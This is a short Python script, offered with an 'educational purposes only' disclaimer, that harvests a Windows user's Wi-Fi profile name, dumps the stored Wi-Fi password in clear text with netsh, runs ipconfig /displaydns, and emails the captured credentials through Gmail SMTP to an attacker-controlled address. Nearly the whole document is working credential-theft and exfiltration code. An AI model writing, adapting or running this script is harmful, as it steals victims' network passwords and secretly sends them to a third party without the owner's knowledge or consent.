# ===================================
# @Created by: Developer Phil
# @Date: 8/23/2021
# @Description: A Script that gathers the users network password, infrastructure and web-history.
# @Purpose: Only for educational and displaying purposes only, I am not responsible for any damages inflicted with this particular script. User cautiously. 
# ===================================
# All modules are imported underneath
import tkinter as tk
from tkinter import *
import tkinter.messagebox
import os
import subprocess
import smtplib, ssl
# ===================================
# Gets the output of the command "netsh wlan show interfaces" which gets info about all networks that the user is connected to
d = subprocess.check_output(["netsh","wlan","show","interfaces"])
# Decodes the output of variable d.
data = d.decode("utf-8")
# Splits the output of data
data = data.split("\n")
names = []

# This for loop allows the hacker to get the network ssh of the user
for line in data:
    if "Profile                :" in line:
        name = line.split(":")[1]
        print(name)

# This command gets the wifi password of the user
e = os.system(f"netsh wlan show profiles {name} key=clear")
# This command gets the user's web history
x = os.system(f"ipconfig /displaydns")
# This command gets all the information of the interfaces the user is connected to
y = os.system(f"netsh wlan show interfaces")

# ===================================
# The port for the email
port = 587  # For starttls
# SMTP server
smtp_server = "smtp.gmail.com"
# The alt account for sending
sender_email = "senders emails"
# The receiving account
receiver_email = "your email"
# Password for alt email
n = "your password"
# Message containing all information
message = f"""\
Subject: Credentials
    
{subprocess.getoutput(f"netsh wlan show profiles {name} key=clear")},thats the end bro!!!"""
    
context = ssl.create_default_context()

# Send the email to the receiver.
with smtplib.SMTP(smtp_server, port) as server:
    server.ehlo()  # Can be omitted
    server.starttls(context=context)
    server.ehlo()  # Can be omitted
    server.login(sender_email, n)
    server.sendmail(sender_email, receiver_email, message)
